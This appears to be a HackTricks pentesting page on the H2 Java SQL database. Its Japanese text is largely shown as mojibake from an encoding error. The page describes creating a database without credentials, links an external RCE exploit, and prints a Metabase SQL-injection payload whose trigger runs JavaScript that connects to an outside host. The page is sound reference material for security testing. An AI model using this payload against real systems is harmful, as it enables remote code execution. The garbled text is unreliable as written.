# H2 - Java SQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

å…¬å¼ãƒšãƒ¼ã‚¸: [https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)

## ã‚¢ã‚¯ã‚»ã‚¹

**ç„¡åŠ¹ãªãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å**ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€**æœ‰åŠ¹ãªèªè¨¼æƒ…å ±ãªã—ã§æ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½œæˆ**ã§ãã¾ã™ï¼ˆ**æœªèªè¨¼**ï¼‰:

![](<../../.gitbook/assets/image (131).png>)

ã¾ãŸã€ä¾‹ãˆã°**mysqlãŒå®Ÿè¡Œä¸­**ã§ã€ãã®**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å**ã¨**èªè¨¼æƒ…å ±**ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã¯ã€ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™:

![](<../../.gitbook/assets/image (201).png>)

_**HTBã®ãƒœãƒƒã‚¯ã‚¹Hawkã‹ã‚‰ã®ãƒˆãƒªãƒƒã‚¯ã€‚**_

## **RCE**

H2ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¨é€šä¿¡ã™ã‚‹ã‚¢ã‚¯ã‚»ã‚¹ãŒã‚ã‚‹å ´åˆã€ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦RCEã‚’å–å¾—ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„: [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

## H2 SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹RCE

[**ã“ã®æŠ•ç¨¿**](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)ã§ã¯ã€**SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**ã‚’æ‚ªç”¨ã—ã¦**H2ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹çµŒç”±ã§RCEã‚’å–å¾—ã™ã‚‹**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚
```json
[...]
"details":
{
"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\n$$--=x\\;",
"advanced-options": false,
"ssl": true
},
[...]
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
